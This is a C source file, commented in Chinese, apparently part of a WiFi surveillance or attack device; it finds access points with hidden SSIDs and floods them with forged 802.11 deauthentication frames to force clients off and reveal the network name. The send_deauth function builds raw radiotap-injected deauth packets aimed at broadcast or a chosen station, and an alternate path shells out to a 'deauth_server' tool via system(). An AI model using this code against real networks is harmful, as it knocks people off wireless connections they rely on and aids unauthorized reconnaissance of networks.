/*
 * scan_hided_ssid.c
 *
 *  Created on: 2019-11-28
 *      Author: andy
 */


/*
    功能需求：
        对就隐藏SSID的AP，需要向其发送deauth packet并接收其response帧从中解析出SSID，
    实现方式：
        在探测阶段添加某一条WiFi链路信息到链表中时(wlan_list_add_info)，当遍历完所有bssid相同的链路记录时
        如果没有任何一条记录有SSID,则在函数return之前检查if (ssid_valid == false)，如果bssid_valid为false
        则将当前bssid添加到deauth_target_list中，并在另一个线程中逐条发送deauth packet
*/
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <malloc.h>
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <fcntl.h>
#include <time.h>
#include <netinet/in.h>
#include"wlan_list.h"
#include "wifi_sniffer.h"
#include "mac80211_atk.h"
#include "gimbal.h"
#include "scan_hided_ssid.h"
#include "wifi_decrypt.h"
#include "DataProcess.h"
//struct wlan_list * HideApSrch[2];

//void hide_ap_srch_init(uint8_t ucchl)
//{
   // HideApSrch[ucchl] = get_wlan_list(1);
//}
/*****************************************************************
* 函数描述：隐藏ap节点获取函数，用于从链表中获取没有ssid的数据节点，并发送deauth包
* 参数：	  uint8_t ucch 设置网卡的通道号
* 返回值： 无
****************************************************************/
void get_hide_ap(uint8_t  ucchl)
{
	uint8_t ucworkchl=0;
	uint8_t ucssid_flag=0;
	uint8_t uccom_flag=0;
    struct wlan_list * hlist = get_wlan_list(ucchl);
    struct wlan_list * cur_list=NULL;
//    printf("start :\n");
    while (hlist != NULL &&PcapOn[ucchl]) {
//    	printf("%s %d %#02x:%#02x:%#02x:%#02x:%#02x:%#02x chl %d curchl %d",__func__,__LINE__,
//    			hlist->info.bssid[0],hlist->info.bssid[1],hlist->info.bssid[2],
//    			hlist->info.bssid[3],hlist->info.bssid[4],hlist->info.bssid[5],hlist->info.workchl,ucworkchl);
//    	if(hlist->info.ssid != NULL){
//    		printf("ssid %s",hlist->info.ssid );
//    	}
//    	printf("\n");
    	pthread_mutex_lock(&g_tchl_mutex);//上锁防止被抓包线程打断
    	ucworkchl=g_curchl[ucchl];
    	pthread_mutex_unlock(&g_tchl_mutex);//上锁防止被抓包线程打断

    	uccom_flag=0;
    	if(cur_list != NULL){
			if(cur_list->info.ssid!=NULL){ //当前节点是否有ssid
				ucssid_flag=1;
			}
			if(memcmp(cur_list->info.bssid,hlist->info.bssid,6) != 0){  //两个节点 bssid 是否相同
				uccom_flag=1;
				if(ucssid_flag == 0){ //隐藏ssid
					if (cur_list->info.workchl != ucworkchl) {
						cur_list=hlist;
						hlist = hlist->next;
						continue;
					}
					send_deauth(cur_list->info.bssid,ucchl,ucworkchl);
				}
				ucssid_flag =0;
			}
    	}
    	cur_list=hlist;
		hlist = hlist->next;
    }
    if(cur_list != NULL){
    	if(uccom_flag == 1){//如果最后一次对比 ，bssid地址不同
    		if(cur_list->info.ssid ==NULL &&cur_list->info.workchl == ucworkchl){//如果ssid为空，且信道相同
    			send_deauth(cur_list->info.bssid,ucchl,ucworkchl);
			}
    	}
    	else {
    		if(cur_list->info.ssid ==NULL &&cur_list->info.workchl == ucworkchl&&ucssid_flag==0){//如果相同bssid一直为空，且信道相同
    			send_deauth(cur_list->info.bssid,ucchl,ucworkchl);
    		}
    	}
    }
}
#ifdef ZRRJ
/*****************************************************************
* 函数描述：deauth 数据发送函数，用于调用无线网卡发送deauth数据
* 参数：	  uint8_t * bssid bssid mac
* 		  uint8_t ucchl  通道号  0 2.4G
* 		  						1 5.8G
* 		  uint8_t ucworkchl 工作信道
* 返回值： 无
****************************************************************/
void *send_deauth(uint8_t * bssid,uint8_t ucchl,uint8_t ucworkchl)
{
	char cmd[128], cbuf[200],cdev[20],cwchl[20];

	strcpy(cdev,UserCfgJson.wlan_dev[ucchl+2]);
	memset(cbuf,0,sizeof(cbuf));
	snprintf(cbuf, sizeof(cbuf),"iwlist %s channel|grep \"(\"|awk \'{print $5}\'|awk -F\')\' \'{print $1}\'", cdev);
	printf("%s\n",cbuf);
	sys_get(cbuf,cwchl,10);
	if(atoi(cwchl) != ucworkchl)
	{
		printf("cwchl %d workchl %d\n",atoi(cwchl),ucworkchl);
		sprintf(cmd,"iwconfig %s channel %d",cdev,ucworkchl);//控制网卡信道切换
		system(cmd);
		usleep(10000);
	}
	sprintf(cmd,"deauth_server %s %d FF-FF-FF-FF-FF-FF %02x-%02x-%02x-%02x-%02x-%02x %d",cdev,20,
			bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],50);
	printf("%s\n",cmd);
	system(cmd);

	system("deauth_server stop");
	printf("deauth_stop");
	return NULL;
}
#else
/*****************************************************************
* 函数描述：deauth 数据发送函数，用于调用无线网卡发送deauth数据
* 参数：	  uint8_t * bssid bssid mac
* 		  uint8_t ucchl  通道号  0 2.4G
* 		  						1 5.8G
* 		  uint8_t ucworkchl 工作信道
* 返回值： 无
****************************************************************/
void * send_deauth(uint8_t * bssid,uint8_t ucchl,uint8_t ucworkchl)
{
	char cmd[128], cbuf[200],cdev[20],cmdbuf[128];
	struct ifreq ifr;
	struct packet_mreq mr;
	struct sockaddr_ll sll;
	uint8_t devidx =0;
	struct DC_device dev;
	uint8_t sendnum =20;
	uint8_t u8aRadiotap[] = {
		0x00, 0x00, 			// <-- radiotap version
		0x0c, 0x00, 			// <- radiotap header length
		0x04, 0x80, 0x00, 0x00, // <-- bitmap
		0x00, 					// <-- rate
		0x00, 					// <-- padding for natural alignment
		0x18, 0x00, 			// <-- TX flags
	};

	uint8_t deauth_pkt[30] =
	{
		0xc0, 0x00,
		0x3a, 0x01,
		0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
		0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb,
		0xbb, 0xbb, 0xbb, 0xbb, 0xbb, 0xbb,
		0x00, 0x00,
		0x70, 0x00
	};

	unsigned char sendbuf[128];
	unsigned long send_pkt_num = 0;

	int   count, ret;
	if(ucchl == 0)
		devidx=3;
	else
		devidx =2 ;
	memset( &cmd, 0, sizeof( cmd) );
	memset( &dev, 0, sizeof( dev ) );

	sprintf(cbuf,"uci get wspy.wlan.dev%d",devidx);//获取设备名称
	sys_get(cbuf,cdev,10);
    sprintf(cmdbuf,"iwconfig %s channel %d",cdev,ucworkchl);//控制网卡信道切换
	system(cmdbuf);
	usleep(10000);
	dev.rate = 0x0c; /* default to 1Mbps if nothing is set
		  2 1M
		  0xc 6M*/
	dev.iface_len = strlen(cdev);
	sprintf (dev.iface, "%.*s", dev.iface_len, cdev);
	memcpy(dev.s_bssid, bssid, 6 );

	if (( dev.fd_out = socket( PF_PACKET, SOCK_RAW,
							   htons( ETH_P_ALL ) ) ) < 0 )
	{
		printf( "socket(PF_PACKET) failed\n" );
	}

	memset (&ifr, 0, sizeof (ifr));
	strncpy (ifr.ifr_name, dev.iface, dev.iface_len);

	if( ioctl( dev.fd_out, SIOCGIFINDEX, &ifr ) < 0 )
	{
		printf("Interface %s: \n", dev.iface);
		perror( "ioctl(SIOCGIFINDEX) failed" );
		return NULL;
	}

	memset( &sll, 0, sizeof( sll ) );
	sll.sll_family   = AF_PACKET;
	sll.sll_ifindex  = ifr.ifr_ifindex;

	sll.sll_protocol = htons( ETH_P_ALL );

	/* bind the raw socket to the interface */
	if( bind( dev.fd_out, (struct sockaddr *) &sll,
			  sizeof( sll ) ) < 0 )
	{
		printf("Interface %s: \n", dev.iface);
		perror( "bind(ETH_P_ALL) failed" );
		return NULL;
	}

	/* enable promiscuous mode */

	memset( &mr, 0, sizeof( mr ) );
	mr.mr_ifindex = sll.sll_ifindex;
	mr.mr_type = PACKET_MR_PROMISC;

	if( setsockopt( dev.fd_out, SOL_PACKET, PACKET_ADD_MEMBERSHIP,
					&mr, sizeof( mr ) ) < 0 )
	{
		printf( "setsockopt(PACKET_MR_PROMISC) failed\n" );
		return NULL;
	}

	if(AtkInfo.taget == ATK_TAGET_STA)
		memcpy( deauth_pkt +  4, AtkInfo.sta_mac,   6 );
	else
		memcpy( deauth_pkt +  4, BROADCAST,   6 );

	memcpy( deauth_pkt + 10, dev.s_bssid, 6 );
	memcpy( deauth_pkt + 16, dev.s_bssid, 6 );

	deauth_pkt[22] = (send_pkt_num & 0x0000000F) << 4;
	deauth_pkt[23] = (send_pkt_num & 0x00000FF0) >> 4;

	count = 26;
	u8aRadiotap[8] = dev.rate;

	memcpy(sendbuf, u8aRadiotap, sizeof (u8aRadiotap) );
	memcpy(sendbuf + sizeof (u8aRadiotap), deauth_pkt, count);
	count += sizeof (u8aRadiotap);

	printf ("sendbuf count=%d\n",count);
	for (int i=0; i<count; i++){
		printf ("%02x ", sendbuf[i]);
	}
	printf ("\n");

	while (sendnum>0)
	{
		usleep (50000);
//		usleep (100000);

		ret = write (dev.fd_out, sendbuf, count);
		if( ret < 0 )
		{
			perror( "write failed" );
			return NULL;
		}
		sendnum--;
		send_pkt_num++;

		if ((send_pkt_num % 10) == 0)
			printf("sendnum %ld\n",send_pkt_num);
	}
	close(dev.fd_out);
	return NULL;
}
#endif
/*****************************************************************
* 函数描述：隐藏节点线程处理函数
* 参数：	  void *arg 通道号 0 2.4G
* 						  1 5.8G
* 返回值： 无
****************************************************************/
void deauth_process(void *arg)
{
	uint8_t ucchl=*((uint8_t *)arg);

	while((PcapOn[ucchl] == true )&&(DecryptOn == false)){

		//TODO: get the frequency that wifi monitor on the moment
		get_hide_ap(ucchl);

		//TODO: send deauth packet
		//usleep(1000); //wait for 100ms, 可以试试能否发的更快
	}
	printf("%s exit\n",__func__);
}
